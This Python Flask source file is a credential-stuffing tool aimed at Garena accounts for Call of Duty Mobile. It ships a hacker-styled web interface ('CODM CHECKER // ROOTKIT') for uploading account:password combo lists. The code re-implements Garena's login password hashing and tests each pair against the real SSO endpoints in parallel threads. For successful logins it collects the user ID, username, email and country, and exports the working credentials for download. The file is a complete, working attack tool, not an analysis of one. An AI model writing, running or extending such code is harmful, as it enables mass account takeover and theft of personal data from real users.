from flask import Flask, request, render_template_string, jsonify, send_file
import requests
import hashlib
import time
import os
import uuid
import threading
import zipfile
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

app = Flask(__name__)
BASE = Path(__file__).resolve().parent
UPLOAD = BASE / "uploads"
RESULTS = BASE / "results"
UPLOAD.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

jobs = {}
jobs_lock = threading.Lock()

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CODM CHECKER // ROOTKIT</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
:root{--bg:#000;--panel:#0a0f0a;--border:#00ff41;--text:#00ff41;--muted:#00aa2a;--red:#ff003c;--yellow:#ffff00}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Share Tech Mono',monospace;background:#000;color:var(--text);min-height:100vh;padding:16px;background-image:linear-gradient(rgba(0,255,65,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,65,0.03) 1px,transparent 1px);background-size:20px 20px}
.wrap{max-width:920px;margin:0 auto}
.logo{font-size:1.4rem;letter-spacing:2px;text-shadow:0 0 10px #00ff41;margin-bottom:16px}
.logo span{color:#fff}
.card{background:var(--panel);border:1px solid var(--border);padding:16px;margin-bottom:14px;box-shadow:0 0 15px rgba(0,255,65,0.1)}
h2{font-size:.75rem;color:var(--muted);letter-spacing:.15em;margin-bottom:12px}
.drop{border:1px dashed var(--border);padding:24px;text-align:center;cursor:pointer;background:#000}
.drop input{display:none}
.fname{color:#00ff41;margin-top:8px;word-break:break-all}
.row{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px;align-items:center}
label{font-size:.8rem;color:var(--muted)}
input,select{background:#000;border:1px solid var(--border);color:var(--text);padding:9px 11px;font-family:inherit}
button{border:1px solid var(--border);background:#003300;color:#00ff41;padding:11px 16px;font-family:inherit;font-weight:600;cursor:pointer}
button:disabled{opacity:.4}
.btn-danger{background:#1a0000;color:#ff003c;border-color:#ff003c}
.btn-ok{background:#001a00;color:#00ff41}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
.stat{background:#000;border:1px solid var(--border);padding:10px;text-align:center}
.stat .n{font-size:1.3rem;font-weight:700}
.stat .l{font-size:.7rem;color:var(--muted)}
.bar-wrap{height:6px;background:#001a00;margin:12px 0 6px;border:1px solid #003300}
.bar{height:100%;background:#00ff41;width:0%;transition:width .3s}
#logBox{background:#000;border:1px solid #003300;height:240px;overflow-y:auto;padding:10px;font-size:.82rem;margin-top:10px;line-height:1.45}
.live{color:#00ff41}
.dead{color:#ff003c}
.error{color:#ffff00}
.hidden{display:none!important}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">CODM <span>CHECKER</span> // ROOTKIT</div>
  <div class="card">
    <h2>// LOAD COMBO FILE</h2>
    <div class="drop" id="dropZone">
      <div>DROP .txt OR CLICK</div>
      <div class="fname" id="fileName"></div>
      <input type="file" id="fileInput" accept=".txt">
    </div>
    <div class="row">
      <label>THREADS <input type="number" id="threads" value="8" min="1" max="20" style="width:70px"></label>
      <button id="btnStart">START</button>
      <button id="btnStop" class="btn-danger" disabled>STOP</button>
    </div>
  </div>
  <div class="card">
    <h2>// LIVE STATS</h2>
    <div class="stats">
      <div class="stat"><div class="n" id="sDone">0</div><div class="l">DONE</div></div>
      <div class="stat"><div class="n" id="sTotal">0</div><div class="l">TOTAL</div></div>
      <div class="stat"><div class="n live" id="sLive">0</div><div class="l">LIVE</div></div>
      <div class="stat"><div class="n dead" id="sDead">0</div><div class="l">DEAD</div></div>
    </div>
    <div class="bar-wrap"><div class="bar" id="bar"></div></div>
    <div id="logBox"></div>
    <div class="row">
      <button id="btnZip" class="btn-ok hidden">DOWNLOAD LIVE</button>
      <button id="btnAll" class="hidden">DOWNLOAD ALL</button>
    </div>
  </div>
</div>
<script>
const $=id=>document.getElementById(id);
let selectedFile=null, jobId=null, pollTimer=null;
const drop=$("dropZone"), fin=$("fileInput");
drop.onclick=()=>fin.click();
fin.onchange=e=>{if(e.target.files[0]){selectedFile=e.target.files[0];$("fileName").textContent=selectedFile.name}};
drop.ondragover=e=>{e.preventDefault()};
drop.ondrop=e=>{e.preventDefault();if(e.dataTransfer.files[0]){selectedFile=e.dataTransfer.files[0];$("fileName").textContent=selectedFile.name}};

function esc(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;")}
function log(msg,cls){const d=document.createElement("div");d.className=cls||"";d.innerHTML=esc(msg);$("logBox").appendChild(d);$("logBox").scrollTop=99999}

$("btnStart").onclick=async()=>{
  if(!selectedFile)return;
  $("btnStart").disabled=true;$("btnStop").disabled=false;
  $("btnZip").classList.add("hidden");$("btnAll").classList.add("hidden");
  $("logBox").innerHTML="";$("sDone").textContent=0;$("sLive").textContent=0;$("sDead").textContent=0;$("bar").style.width="0%";
  const fd=new FormData();
  fd.append("file",selectedFile);
  fd.append("threads",$("threads").value||"8");
  const r=await fetch("/api/start",{method:"POST",body:fd});
  const j=await r.json();
  if(!j.ok){alert(j.error||"fail");$("btnStart").disabled=false;$("btnStop").disabled=true;return}
  jobId=j.job_id;$("sTotal").textContent=j.total||0;
  if(pollTimer)clearInterval(pollTimer);
  pollTimer=setInterval(poll,1000);poll();
};
$("btnStop").onclick=async()=>{if(jobId)await fetch("/api/stop/"+jobId,{method:"POST"});$("btnStop").disabled=true};
$("btnZip").onclick=()=>{if(jobId)location="/api/download/"+jobId+"/live"};
$("btnAll").onclick=()=>{if(jobId)location="/api/download/"+jobId+"/all"};

async function poll(){
  if(!jobId)return;
  const r=await fetch("/api/status/"+jobId);const j=await r.json();if(!j.ok)return;
  $("sDone").textContent=j.done;$("sTotal").textContent=j.total;
  $("sLive").textContent=j.live;$("sDead").textContent=j.dead;
  const pct=j.total? (j.done/j.total*100):0;
  $("bar").style.width=pct.toFixed(1)+"%";
  if(j.log && j.log.length){
    $("logBox").innerHTML=j.log.map(l=>{
      let cls="error";
      if(l.includes("LIVE"))cls="live";
      else if(l.includes("DEAD"))cls="dead";
      return "<div class='"+cls+"'>"+esc(l)+"</div>";
    }).join("");
    $("logBox").scrollTop=99999;
  }
  if(j.status==="finished"||j.status==="stopped"){
    clearInterval(pollTimer);pollTimer=null;
    $("btnStop").disabled=true;$("btnStart").disabled=false;
    if(j.live>0)$("btnZip").classList.remove("hidden");
    $("btnAll").classList.remove("hidden");
  }
}
</script>
</body>
</html>
"""

def hash_password(password, v1, v2):
    passmd5 = hashlib.md5(password.encode()).hexdigest()
    inner = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer = hashlib.sha256((inner + v2).encode()).hexdigest()
    return outer

def check_one(combo):
    try:
        if ":" not in combo:
            return {"combo": combo, "status": "ERROR", "line": combo + " | ERROR | bad format"}
        account, password = combo.strip().split(":", 1)
        account = account.strip()
        password = password.strip()
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://account.garena.com/",
        }
        pre = session.get(
            "https://sso.garena.com/api/prelogin",
            params={"app_id": "10100", "account": account, "format": "json", "id": str(int(time.time()*1000))},
            headers=headers, timeout=12
        )
        pre_data = pre.json()
        if pre_data.get("error"):
            return {"combo": combo, "status": "DEAD", "line": f"{account}:{password} | DEAD"}
        v1 = pre_data.get("v1", "")
        v2 = pre_data.get("v2", "")
        if not v1 or not v2:
            return {"combo": combo, "status": "DEAD", "line": f"{account}:{password} | DEAD"}
        hashed = hash_password(password, v1, v2)
        login = session.get(
            "https://sso.garena.com/api/login",
            params={
                "app_id": "10100", "account": account, "password": hashed,
                "format": "json", "id": str(int(time.time()*1000)),
                "redirect_uri": "https://account.garena.com/"
            },
            headers=headers, timeout=12
        )
        data = login.json()
        if data.get("uid") or data.get("session_key"):
            uid = data.get("uid", "")
            username = data.get("username") or account
            # try get more info
            extra = ""
            try:
                sk = data.get("session_key", "")
                if sk:
                    info = session.get(
                        "https://account.garena.com/api/account/init",
                        params={"session_key": sk},
                        headers=headers, timeout=8
                    ).json()
                    ui = info.get("user_info") or {}
                    email = ui.get("email") or ""
                    country = ui.get("country") or ""
                    extra = f" | UID:{uid} | User:{username} | Email:{email} | Country:{country}"
            except:
                extra = f" | UID:{uid} | User:{username}"
            return {
                "combo": combo,
                "status": "LIVE",
                "line": f"{account}:{password} | LIVE{extra}",
                "account": account,
                "password": password,
                "uid": uid,
                "username": username
            }
        return {"combo": combo, "status": "DEAD", "line": f"{account}:{password} | DEAD"}
    except Exception as e:
        return {"combo": combo, "status": "ERROR", "line": f"{combo} | ERROR | {str(e)[:60]}"}

class Job:
    def __init__(self, job_id, combos, threads=8):
        self.job_id = job_id
        self.combos = combos
        self.threads = max(1, min(int(threads), 20))
        self.status = "running"
        self.total = len(combos)
        self.done = 0
        self.live = 0
        self.dead = 0
        self.log = []
        self.live_lines = []
        self.all_lines = []
        self.stop_event = threading.Event()
        self.lock = threading.Lock()

    def run(self):
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(check_one, c): c for c in self.combos}
            for fut in as_completed(futures):
                if self.stop_event.is_set():
                    break
                res = fut.result()
                with self.lock:
                    self.done += 1
                    self.all_lines.append(res["line"])
                    if res["status"] == "LIVE":
                        self.live += 1
                        self.live_lines.append(res["line"])
                    elif res["status"] == "DEAD":
                        self.dead += 1
                    self.log.append(res["line"])
                    if len(self.log) > 300:
                        self.log = self.log[-300:]
        self.status = "stopped" if self.stop_event.is_set() else "finished"

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/start", methods=["POST"])
def api_start():
    f = request.files.get("file")
    if not f:
        return jsonify({"ok": False, "error": "no file"})
    threads = request.form.get("threads", "8")
    content = f.read().decode("utf-8", errors="ignore")
    combos = [l.strip() for l in content.splitlines() if ":" in l]
    if not combos:
        return jsonify({"ok": False, "error": "no valid combos"})
    job_id = str(uuid.uuid4())[:8]
    job = Job(job_id, combos, threads)
    with jobs_lock:
        jobs[job_id] = job
    t = threading.Thread(target=job.run, daemon=True)
    t.start()
    return jsonify({"ok": True, "job_id": job_id, "total": len(combos)})

@app.route("/api/status/<job_id>")
def api_status(job_id):
    job = jobs.get(job_id)
    if not job:
        return jsonify({"ok": False})
    with job.lock:
        return jsonify({
            "ok": True,
            "status": job.status,
            "done": job.done,
            "total": job.total,
            "live": job.live,
            "dead": job.dead,
            "log": job.log[-80:]
        })

@app.route("/api/stop/<job_id>", methods=["POST"])
def api_stop(job_id):
    job = jobs.get(job_id)
    if job:
        job.stop_event.set()
    return jsonify({"ok": True})

@app.route("/api/download/<job_id>/<kind>")
def api_download(job_id, kind):
    job = jobs.get(job_id)
    if not job:
        return "not found", 404
    path = RESULTS / f"{job_id}_{kind}.txt"
    lines = job.live_lines if kind == "live" else job.all_lines
    path.write_text("\n".join(lines), encoding="utf-8")
    return send_file(path, as_attachment=True, download_name=f"codm_{kind}_{job_id}.txt")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5050))
    app.run(host="0.0.0.0", port=port, debug=False)
